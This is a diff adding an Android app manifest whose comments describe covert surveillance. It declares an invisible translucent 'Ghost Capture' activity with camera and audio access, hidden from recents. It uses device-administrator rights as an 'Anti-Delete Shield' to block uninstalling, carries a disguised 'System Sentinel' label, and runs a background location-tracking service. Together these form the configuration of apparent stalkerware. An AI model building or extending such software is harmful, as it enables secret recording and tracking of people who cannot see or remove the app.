@@ -1,0 +1,65 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android">
+
+    <!-- REQUIRED PERMISSIONS FOR GHOST CAPTURE & TRACKING -->
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
+
+    <!-- REQUIRED PERMISSIONS FOR HYDRA BLE MESH NETWORK -->
+    <uses-permission android:name="android.permission.BLUETOOTH" />
+    <uses-permission android:name="android.permission.BLUETOOTH_ADMIN" />
+    <!-- Android 12+ Bluetooth Permissions -->
+    <uses-permission android:name="android.permission.BLUETOOTH_ADVERTISE" />
+    <uses-permission android:name="android.permission.BLUETOOTH_SCAN" />
+    <uses-permission android:name="android.permission.BLUETOOTH_CONNECT" />
+    
+    <!-- HARDWARE REQUIREMENTS -->
+    <uses-feature android:name="android.hardware.camera" android:required="true" />
+    <uses-feature android:name="android.hardware.camera.front" android:required="false" />
+
+    <application>
+
+        <!-- 
+        ========================================================================
+        1. GHOST CAPTURE ACTIVITY
+        Important: Theme must be Translucent and NoTitleBar so it is 100% invisible
+        ======================================================================== 
+        -->
+        <activity 
+            android:name=".services.GhostCaptureActivity"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar"
+            android:excludeFromRecents="true"
+            android:taskAffinity=""
+            android:configChanges="orientation|screenSize" />
+
+        <!-- 
+        ========================================================================
+        2. ANTI-DELETE SHIELD (DEVICE ADMINISTRATOR)
+        Locks the App into the OS, greying out the Uninstall button.
+        ======================================================================== 
+        -->
+        <receiver 
+            android:name=".services.SentinelAdminReceiver"
+            android:description="@string/admin_description"
+            android:label="PTS System Sentinel API"
+            android:permission="android.permission.BIND_DEVICE_ADMIN"
+            android:exported="true">
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@xml/device_admin_receiver" />
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+                <action android:name="android.app.action.DEVICE_ADMIN_DISABLED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- 3. MAIN BACKGROUND TRACKING SERVICE -->
+        <service 
+            android:name=".services.SentinelTrackingService"
+            android:foregroundServiceType="location"
+            android:exported="false" />
+
+    </application>
+</manifest>
